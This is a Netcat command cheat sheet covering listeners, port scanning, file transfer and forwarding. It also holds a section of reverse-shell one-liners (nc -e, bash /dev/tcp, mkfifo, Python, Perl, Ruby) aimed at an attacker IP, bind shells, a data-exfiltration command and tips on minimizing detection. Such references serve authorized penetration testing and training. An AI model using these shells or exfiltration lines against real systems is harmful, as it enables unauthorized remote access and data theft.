# Netcat Cheat Sheet

## Overview

Netcat (nc) is a versatile networking tool used for:

- Creating reverse and bind shells.
- Port scanning and enumeration.
- File transfers.
- Port forwarding and pivoting.
- Network debugging and testing.
- Conducting authorized security assessments.

Netcat provides:

- Simple TCP/UDP connections.
- Listening and connecting modes.
- File transfer capabilities.
- Port scanning functionality.
- Scripting and automation support.

---

# 1. Starting Netcat

## Basic syntax

```bash
nc [options] <host> <port>
```

## Show help

```bash
nc -h
```

## Show version

```bash
nc -V
```

## Netcat variants

- `nc` - Original Netcat
- `ncat` - Nmap's Netcat (enhanced version)
- `netcat` - Alternative implementation

---

# 2. Listening Modes

## Listen on a port

```bash
nc -l -p <port>
```

Example:

```bash
nc -l -p 4444
```

## Listen and keep listening after disconnect

```bash
nc -l -p <port> -k
```

Example:

```bash
nc -l -p 4444 -k
```

## Listen with verbose output

```bash
nc -l -p <port> -v
```

Example:

```bash
nc -l -p 4444 -v
```

## Listen on all interfaces

```bash
nc -l -p <port> 0.0.0.0
```

Example:

```bash
nc -l -p 4444 0.0.0.0
```

## Listen on specific interface

```bash
nc -l -p <port> -s <interface-ip>
```

Example:

```bash
nc -l -p 4444 -s 192.168.1.10
```

## Listen with UDP

```bash
nc -u -l -p <port>
```

Example:

```bash
nc -u -l -p 53
```

---

# 3. Connecting Modes

## Connect to a port

```bash
nc <host> <port>
```

Example:

```bash
nc 192.168.1.10 4444
```

## Connect with verbose output

```bash
nc -v <host> <port>
```

Example:

```bash
nc -v 192.168.1.10 4444
```

## Connect with very verbose output

```bash
nc -vv <host> <port>
```

Example:

```bash
nc -vv 192.168.1.10 4444
```

## Connect with timeout

```bash
nc -w <seconds> <host> <port>
```

Example:

```bash
nc -w 5 192.168.1.10 4444
```

## Connect using UDP

```bash
nc -u <host> <port>
```

Example:

```bash
nc -u 192.168.1.10 53
```

## Connect using IPv6

```bash
nc -6 <host> <port>
```

Example:

```bash
nc -6 ::1 4444
```

---

# 4. Reverse Shells

## Netcat reverse shell (Linux)

**On attacker machine:**

```bash
nc -l -p 4444
```

**On target machine:**

```bash
nc -e /bin/bash <attacker-ip> 4444
```

## Netcat reverse shell with bash

**On attacker machine:**

```bash
nc -l -p 4444
```

**On target machine:**

```bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

## Netcat reverse shell (Windows)

**On attacker machine:**

```bash
nc -l -p 4444
```

**On target machine:**

```bash
nc -e cmd.exe <attacker-ip> 4444
```

## Netcat reverse shell with named pipe

**On attacker machine:**

```bash
nc -l -p 4444
```

**On target machine:**

```bash
mkfifo f; cat f | /bin/bash -i 2>&1 | nc <attacker-ip> 4444 >f
```

## Netcat reverse shell with Python

**On attacker machine:**

```bash
nc -l -p 4444
```

**On target machine:**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## Netcat reverse shell with Python3

**On attacker machine:**

```bash
nc -l -p 4444
```

**On target machine:**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## Netcat reverse shell with Perl

**On attacker machine:**

```bash
nc -l -p 4444
```

**On target machine:**

```bash
perl -e 'use Socket;$i="<attacker-ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

## Netcat reverse shell with Ruby

**On attacker machine:**

```bash
nc -l -p 4444
```

**On target machine:**

```bash
ruby -rsocket -e'f=TCPSocket.open("<attacker-ip>",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

---

# 5. Bind Shells

## Netcat bind shell (Linux)

**On target machine:**

```bash
nc -l -p 4444 -e /bin/bash
```

**On attacker machine:**

```bash
nc <target-ip> 4444
```

## Netcat bind shell (Windows)

**On target machine:**

```bash
nc -l -p 4444 -e cmd.exe
```

**On attacker machine:**

```bash
nc <target-ip> 4444
```

## Netcat bind shell with bash

**On target machine:**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l -p 4444 >/tmp/f
```

**On attacker machine:**

```bash
nc <target-ip> 4444
```

---

# 6. File Transfers

## Transfer file from attacker to target

**On attacker machine (sender):**

```bash
nc -l -p 4444 < file.txt
```

**On target machine (receiver):**

```bash
nc <attacker-ip> 4444 > file.txt
```

## Transfer file from target to attacker

**On target machine (sender):**

```bash
nc <attacker-ip> 4444 < file.txt
```

**On attacker machine (receiver):**

```bash
nc -l -p 4444 > file.txt
```

## Transfer directory (tar + nc)

**On sender:**

```bash
tar czf - directory/ | nc -l -p 4444
```

**On receiver:**

```bash
nc <sender-ip> 4444 | tar xzf -
```

## Transfer file with progress

**On sender:**

```bash
nc -l -p 4444 < file.txt
```

**On receiver:**

```bash
nc -v <sender-ip> 4444 > file.txt
```

## Multiple file transfer

**On sender:**

```bash
tar czf - file1.txt file2.txt file3.txt | nc -l -p 4444
```

**On receiver:**

```bash
nc <sender-ip> 4444 | tar xzf -
```

---

# 7. Port Scanning

## Basic port scan

```bash
nc -v -z <host> <start-port>-<end-port>
```

Example:

```bash
nc -v -z 192.168.1.10 1-1000
```

## Scan specific ports

```bash
nc -v -z <host> <port1> <port2> <port3>
```

Example:

```bash
nc -v -z 192.168.1.10 21 22 80 443
```

## Scan with timeout

```bash
nc -v -z -w <seconds> <host> <start-port>-<end-port>
```

Example:

```bash
nc -v -z -w 2 192.168.1.10 1-1000
```

## UDP port scan

```bash
nc -u -v -z <host> <start-port>-<end-port>
```

Example:

```bash
nc -u -v -z 192.168.1.10 1-1000
```

## Scan and save output

```bash
nc -v -z <host> <start-port>-<end-port> > scan_results.txt
```

Example:

```bash
nc -v -z 192.168.1.10 1-1000 > scan_results.txt
```

## Quick service detection

```bash
nc -v <host> <port>
```

Example:

```bash
nc -v 192.168.1.10 80
```

Then type:

```bash
GET / HTTP/1.0
```

---

# 8. Port Forwarding

## Local port forwarding

**On intermediate host:**

```bash
nc -l -p 8080 | nc <destination-host> 80 | nc -l -p 8080
```

## Remote port forwarding

**On attacker machine:**

```bash
nc -l -p 8080 | nc <target-host> 80
```

## Chain port forwarding

**On first hop:**

```bash
nc -l -p 8080 | nc <second-hop> 9090
```

**On second hop:**

```bash
nc -l -p 9090 | nc <final-host> 80
```

## Port forwarding with ncat

**On intermediate host:**

```bash
ncat -l -p 8080 -c "ncat <destination-host> 80"
```

## Bidirectional forwarding

**On intermediate host:**

```bash
mkfifo f1 f2; nc -l -p 8080 0<f1 | nc <destination-host> 80 1>f1 & nc -l -p 8080 0<f2 | nc <destination-host> 80 1>f2
```

---

# 9. Advanced Options

## Execute command on connect

```bash
nc -l -p 4444 -e /bin/bash
```

Example:

```bash
nc -l -p 4444 -e /bin/bash
```

## Execute command after connect

```bash
nc -l -p 4444 -c "command"
```

Example:

```bash
nc -l -p 4444 -c "whoami"
```

## Use source port

```bash
nc -p <source-port> <host> <port>
```

Example:

```bash
nc -p 12345 192.168.1.10 4444
```

## Use specific source IP

```bash
nc -s <source-ip> <host> <port>
```

Example:

```bash
nc -s 192.168.1.10 192.168.1.20 4444
```

## Enable debugging

```bash
nc -d <host> <port>
```

## Use proxy

```bash
nc -x <proxy-host>:<proxy-port> <host> <port>
```

Example:

```bash
nc -x 127.0.0.1:8080 192.168.1.10 4444
```

## Proxy with authentication

```bash
nc -x <proxy-host>:<proxy-port> -X <auth-type> <host> <port>
```

Example:

```bash
nc -x 127.0.0.1:8080 -X 2 192.168.1.10 4444
```

---

# 10. Ncat Enhancements

## Ncat with SSL

**Listener:**

```bash
ncat -l -p 4444 --ssl
```

**Client:**

```bash
ncat <host> 4444 --ssl
```

## Ncat with authentication

**Listener:**

```bash
ncat -l -p 4444 --allow <ip>
```

Example:

```bash
ncat -l -p 4444 --allow 192.168.1.10
```

## Ncat with multiple allows

```bash
ncat -l -p 4444 --allow 192.168.1.10 --allow 192.168.1.20
```

## Ncat with deny

```bash
ncat -l -p 4444 --deny <ip>
```

Example:

```bash
ncat -l -p 4444 --deny 192.168.1.100
```

## Ncat with HTTP proxy

```bash
ncat --proxy <proxy-host>:<proxy-port> <host> <port>
```

Example:

```bash
ncat --proxy 127.0.0.1:8080 192.168.1.10 4444
```

## Ncat with SOCKS proxy

```bash
ncat --proxy-type socks4 --proxy <proxy-host>:<proxy-port> <host> <port>
```

Example:

```bash
ncat --proxy-type socks4 --proxy 127.0.0.1:9050 192.168.1.10 4444
```

## Ncat with chat

**Listener:**

```bash
ncat -l -p 4444 --chat
```

**Client:**

```bash
ncat <host> 4444 --chat
```

---

# 11. Common Attack Scenarios

## Reverse shell listener

```bash
nc -l -p 4444
```

## Bind shell setup

```bash
nc -l -p 4444 -e /bin/bash
```

## File receiver

```bash
nc -l -p 4444 > received_file.txt
```

## File sender

```bash
nc <target-ip> 4444 < file_to_send.txt
```

## Port scan

```bash
nc -v -z 192.168.1.10 1-1000
```

## Service probe

```bash
nc -v 192.168.1.10 80
```

## Banner grabbing

```bash
nc 192.168.1.10 21
```

## HTTP request

```bash
nc 192.168.1.10 80
GET / HTTP/1.0
```

## Simple chat server

```bash
nc -l -p 4444
```

## Data exfiltration

```bash
nc <attacker-ip> 4444 < sensitive_data.txt
```

---

# 12. Practical Workflows

## Basic reverse shell workflow

```text
1. Start netcat listener on attacker.
2. Execute reverse shell on target.
3. Interact with the shell.
4. Perform post-exploitation.
5. Document findings.
```

## Example: Linux reverse shell

```bash
# Attacker
nc -l -p 4444

# Target
nc -e /bin/bash <attacker-ip> 4444
```

## Example: Windows reverse shell

```bash
# Attacker
nc -l -p 4444

# Target
nc -e cmd.exe <attacker-ip> 4444
```

## Example: File transfer

```bash
# Receiver
nc -l -p 4444 > file.txt

# Sender
nc <receiver-ip> 4444 < file.txt
```

## Example: Port scanning

```bash
# Quick scan
nc -v -z 192.168.1.10 21,22,80,443

# Full scan
nc -v -z -w 2 192.168.1.10 1-1000
```

## Example: Banner grabbing

```bash
# FTP banner
nc 192.168.1.10 21

# HTTP banner
nc 192.168.1.10 80
GET / HTTP/1.0

# SSH banner
nc 192.168.1.10 22
```

## Example: Port forwarding

```bash
# Simple forward
nc -l -p 8080 | nc <destination> 80

# With ncat
ncat -l -p 8080 -c "ncat <destination> 80"
```

---

# 13. Common Commands Reference

| Command | Description |
|---|---|
| `nc -h` | Show help |
| `nc -V` | Show version |
| `nc -l -p <port>` | Listen on port |
| `nc -l -p <port> -k` | Listen and keep listening |
| `nc -l -p <port> -e <cmd>` | Execute command on connect |
| `nc <host> <port>` | Connect to host:port |
| `nc -v <host> <port>` | Connect with verbose output |
| `nc -v -z <host> <port>` | Scan port |
| `nc -u <host> <port>` | Use UDP |
| `nc -w <seconds> <host> <port>` | Set timeout |
| `nc -s <ip> <host> <port>` | Use source IP |
| `nc -p <port> <host> <port>` | Use source port |
| `nc -e <cmd> <host> <port>` | Execute command |
| `nc -x <proxy> <host> <port>` | Use proxy |
| `ncat --ssl <host> <port>` | Use SSL |
| `ncat --chat <host> <port>` | Chat mode |
| `ncat --allow <ip>` | Allow specific IP |
| `ncat --deny <ip>` | Deny specific IP |

---

# 14. Troubleshooting

## Connection refused

- Check if listener is running.
- Verify port is not blocked by firewall.
- Ensure correct IP address.
- Check if service is listening.

## Connection timeout

- Increase timeout with `-w`.
- Check network connectivity.
- Verify target is reachable.
- Check firewall rules.

## No data received

- Verify command syntax.
- Check if command executed successfully.
- Ensure proper permissions.
- Verify network path.

## Permission denied

- Run with appropriate privileges.
- Check if port requires root (>1024).
- Verify SELinux/AppArmor policies.
- Use non-privileged ports.

## Slow transfer

- Check network bandwidth.
- Verify network congestion.
- Use compression if available.
- Check for packet loss.

---

# 15. Security Best Practices

## Always verify connections

- Confirm you're connecting to the right host.
- Verify port numbers.
- Check for man-in-the-middle attacks.
- Use encryption when possible.

## Minimize detection

- Use non-standard ports.
- Avoid noisy scanning.
- Use appropriate timing.
- Clean up after testing.

## Use encryption

- Use ncat with SSL when available.
- Consider SSH tunnels for sensitive data.
- Avoid sending credentials in clear text.
- Use VPN for additional security.

## Document everything

- Record all commands used.
- Note connection details.
- Track data transfers.
- Document findings and methods.

## Clean up after testing

- Kill listener processes.
- Remove temporary files.
- Close all connections.
- Verify no backdoors remain.

---

# 16. Important Reminders

- Always obtain explicit authorization before using Netcat.
- Test in a controlled lab environment first.
- Some uses may trigger security alerts.
- Respect network boundaries and policies.
- Keep Netcat updated regularly.
- Validate findings manually.
- Document all actions and commands.
- Preserve original evidence and logs.
- Understand the legal and ethical implications.
- Clean up after testing.

---

# 17. Quick Reference Examples

## Start listener

```bash
nc -l -p 4444
```

## Connect to listener

```bash
nc 192.168.1.10 4444
```

## Reverse shell

```bash
nc -e /bin/bash 192.168.1.10 4444
```

## Bind shell

```bash
nc -l -p 4444 -e /bin/bash
```

## File transfer

```bash
nc -l -p 4444 > file.txt
```

## Port scan

```bash
nc -v -z 192.168.1.10 1-1000
```

## Banner grabbing

```bash
nc 192.168.1.10 80
```

## UDP connection

```bash
nc -u 192.168.1.10 53
```

## With timeout

```bash
nc -w 5 192.168.1.10 4444
```

## Verbose scan

```bash
nc -vv -z 192.168.1.10 1-1000
```

## Ncat with SSL

```bash
ncat --ssl 192.168.1.10 4444
```

---

# 18. Additional Resources

## Netcat Official

```text
http://netcat.sourceforge.net/
```

## Ncat (Nmap)

```text
https://nmap.org/ncat/
```

## Netcat Cheatsheet

```text
https://github.com/udayvir/netcat-cheatsheet
```

## TCP/IP Networking

```text
https://www.tcpipguide.com/
```

## Network Security

```text
https://www.sans.org/
```
